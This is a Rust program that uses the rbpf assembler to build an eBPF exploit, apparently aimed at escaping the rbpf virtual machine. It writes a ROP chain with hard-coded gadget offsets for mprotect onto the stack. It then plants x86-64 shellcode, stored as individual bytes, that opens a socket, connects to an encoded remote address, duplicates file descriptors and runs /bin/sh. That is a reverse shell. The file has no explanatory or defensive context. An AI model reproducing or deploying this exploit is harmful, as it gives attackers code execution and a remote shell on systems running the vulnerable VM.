extern crate rbpf;
use rbpf::assembler::assemble;

fn main() {
    // r3 = 0x3 << 32
    // r2 = prog base
    // r5 = sp
    // mprotect = 0x14E3A414
    // pop rdx = 0x17667F52
    // pop rsi rdi = 0x21DBCFAE
    let prog = assemble(
        "
        mov64 r3, 0x3
        lsh r3, 32
        mov64 r1, 0x40200
        add r1, r3

        ldxdw r5, [r1]
        mov64 r0, 0xc0
        sub r5, r0
        mov64 r7, 0x40
        add r7, r5

        ldxdw r2, [r1+8]
        mov64 r0, 0x1a9121ac
        sub r2, r0

        mov64 r4, 0x17667F52
        add r4, r2
        stxdw [r1+8], r4
        mov64 r4, 7
        stxdw [r1+16], r4
        mov64 r4, 0x21DBCFAE
        add r4, r2
        stxdw [r1+24], r4
        mov64 r4, 0x4000
        mov r6, r5
        mod r6, r4
        sub r5, r6
        stxdw [r1+32], r4
        stxdw [r1+40], r5
        mov64 r4, 0x14E3A414
        add r4, r2
        stxdw [r1+48], r4
        stxdw [r1+56], r7

        stb [r1+64], 106
        stb [r1+65], 41
        stb [r1+66], 88
        stb [r1+67], 106
        stb [r1+68], 2
        stb [r1+69], 95
        stb [r1+70], 106
        stb [r1+71], 1
        stb [r1+72], 94
        stb [r1+73], 153
        stb [r1+74], 15
        stb [r1+75], 5
        stb [r1+76], 72
        stb [r1+77], 137
        stb [r1+78], 197
        stb [r1+79], 72
        stb [r1+80], 184
        stb [r1+81], 1
        stb [r1+82], 1
        stb [r1+83], 1
        stb [r1+84], 1
        stb [r1+85], 1
        stb [r1+86], 1
        stb [r1+87], 1
        stb [r1+88], 2
        stb [r1+89], 80
        stb [r1+90], 72
        stb [r1+91], 184
        stb [r1+92], 3
        stb [r1+93], 1
        stb [r1+94], 254
        stb [r1+95], 230
        stb [r1+96], 126
        stb [r1+97], 1
        stb [r1+98], 1
        stb [r1+99], 3
        stb [r1+100], 72
        stb [r1+101], 49
        stb [r1+102], 4
        stb [r1+103], 36
        stb [r1+104], 106
        stb [r1+105], 42
        stb [r1+106], 88
        stb [r1+107], 72
        stb [r1+108], 137
        stb [r1+109], 239
        stb [r1+110], 106
        stb [r1+111], 16
        stb [r1+112], 90
        stb [r1+113], 72
        stb [r1+114], 137
        stb [r1+115], 230
        stb [r1+116], 15
        stb [r1+117], 5
        stb [r1+118], 106
        stb [r1+119], 3
        stb [r1+120], 94
        stb [r1+121], 72
        stb [r1+122], 255
        stb [r1+123], 206
        stb [r1+124], 120
        stb [r1+125], 11
        stb [r1+126], 86
        stb [r1+127], 106
        stb [r1+128], 33
        stb [r1+129], 88
        stb [r1+130], 72
        stb [r1+131], 137
        stb [r1+132], 239
        stb [r1+133], 15
        stb [r1+134], 5
        stb [r1+135], 235
        stb [r1+136], 239
        stb [r1+137], 106
        stb [r1+138], 104
        stb [r1+139], 72
        stb [r1+140], 184
        stb [r1+141], 47
        stb [r1+142], 98
        stb [r1+143], 105
        stb [r1+144], 110
        stb [r1+145], 47
        stb [r1+146], 47
        stb [r1+147], 47
        stb [r1+148], 115
        stb [r1+149], 80
        stb [r1+150], 72
        stb [r1+151], 137
        stb [r1+152], 231
        stb [r1+153], 104
        stb [r1+154], 114
        stb [r1+155], 105
        stb [r1+156], 1
        stb [r1+157], 1
        stb [r1+158], 129
        stb [r1+159], 52
        stb [r1+160], 36
        stb [r1+161], 1
        stb [r1+162], 1
        stb [r1+163], 1
        stb [r1+164], 1
        stb [r1+165], 49
        stb [r1+166], 246
        stb [r1+167], 86
        stb [r1+168], 106
        stb [r1+169], 8
        stb [r1+170], 94
        stb [r1+171], 72
        stb [r1+172], 1
        stb [r1+173], 230
        stb [r1+174], 86
        stb [r1+175], 72
        stb [r1+176], 137
        stb [r1+177], 230
        stb [r1+178], 49
        stb [r1+179], 210
        stb [r1+180], 106
        stb [r1+181], 59
        stb [r1+182], 88
        stb [r1+183], 15
        stb [r1+184], 5

        exit
        "
    ).unwrap();

    println!("{:?}", prog);
}
